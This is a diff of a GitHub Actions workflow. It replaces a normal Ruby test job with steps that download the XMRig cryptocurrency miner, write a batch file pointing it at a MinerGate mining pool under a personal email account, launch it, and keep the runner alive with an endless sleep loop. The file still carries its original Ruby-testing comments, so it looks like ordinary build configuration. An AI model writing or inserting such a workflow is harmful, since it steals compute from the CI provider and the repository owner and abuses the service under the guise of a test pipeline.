@@ -5,31 +5,36 @@
 # This workflow will download a prebuilt Ruby version, install dependencies and run tests with Rake
 # For more information see: https://github.com/marketplace/actions/setup-ruby-jruby-and-truffleruby
 
-name: Ruby
+# This is a basic workflow to help you get started with Actions
 
-on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+name: runner
+
+on: [push, workflow_dispatch]
 
 jobs:
-  test:
 
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        ruby-version: ['2.6', '2.7', '3.0']
+  build:
+
+    runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v2
-    - name: Set up Ruby
-    # To automatically get bug fixes and new Ruby versions for ruby/setup-ruby,
-    # change this to (see https://github.com/ruby/setup-ruby#versioning):
-    # uses: ruby/setup-ruby@v1
-      uses: ruby/setup-ruby@473e4d8fe5dd94ee328fdfca9f8c9c7afc9dae5e
-      with:
-        ruby-version: ${{ matrix.ruby-version }}
-        bundler-cache: true # runs 'bundle install' and caches installed gems automatically
-    - name: Run tests
-      run: bundle exec rake
+
+    - name: Download
+
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-gcc-win64.zip -OutFile xmrig.zip
+
+    - name: Extract
+
+      run: Expand-Archive -LiteralPath xmrig.Zip
+
+    - name: write
+
+      run: Set-Content -Path '.\xmrig\xmrig-6.12.2\c.bat' -Value 'xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u devintaison568@gmail.com -p x --threads=1'
+
+    - name: run
+
+      run: cd .\xmrig\xmrig-6.12.2\ ; start-process c.bat
+
+    - name: walk
+
+      run: for (;;){$i++; Write-Host $i ; Start-Sleep -s 10}
